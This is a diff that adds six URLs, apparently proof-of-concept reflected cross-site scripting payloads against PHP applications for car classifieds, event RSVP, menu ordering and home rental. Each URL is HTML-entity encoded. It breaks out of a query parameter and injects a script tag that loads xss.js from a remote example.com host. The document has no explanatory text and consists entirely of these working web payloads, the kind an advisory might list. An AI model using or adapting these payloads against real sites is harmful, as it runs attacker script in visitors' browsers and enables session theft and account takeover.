@@ -1,0 +1,6 @@
+http://www.example.com/car_classifieds/listings/index.php?pag=car_view&amp;car_id=32&amp;offset=0&amp;ord=1&amp;make_id=63&#039;&gt;&quot;&gt;&#039;&gt;&lt;SCRIPT%20SRC=http://www.example.com/xss.js&gt;&lt;/SCRIPT&gt;
+http://www.example.com/car_classifieds/listings/index.php?pag=car_list&amp;ord=1&amp;make_id=63&#039;&gt;&quot;&gt;&#039;&gt;&lt;SCRIPT%20SRC=http://www.example.com/xss.js&gt;&lt;/SCRIPT&gt;
+http://www.example.com/rsvp3/view-event-details.php?event_id=74&#039;&gt;&quot;&gt;&#039;&gt;&lt;SCRIPT%20SRC=http://www.example.com/xss.js&gt;&lt;/SCRIPT&gt;
+http://www.example.com/rsvp3/event-registration.php?select_events=74&#039;&gt;&quot;&gt;&#039;&gt;&lt;SCRIPT%20SRC=http://www.example.com/xss.js&gt;&lt;/SCRIPT&gt;&amp;submit=Register
+http://www.example.com/fastmenu/index.php?pag=gift_certificate&amp;sel_menu=5&#039;&gt;&quot;&gt;&#039;&gt;&lt;SCRIPT%20SRC=http://www.example.com/xss.js&gt;&lt;/SCRIPT&gt;
+http://www.example.com/home_rental/index.php?pag=list_properties&amp;act=basket-add&amp;id=17&amp;type=room&amp;ofs=0&amp;day=11&amp;month=6&amp;year=2006&amp;night=1&amp;hotel_id=&amp;show=&amp;sel_menu=&#039;&gt;&quot;&gt;&#039;&gt;&lt;SCRIPT%20SRC=http://www.example.com/xss.js&gt;&lt;/SCRIPT&gt;
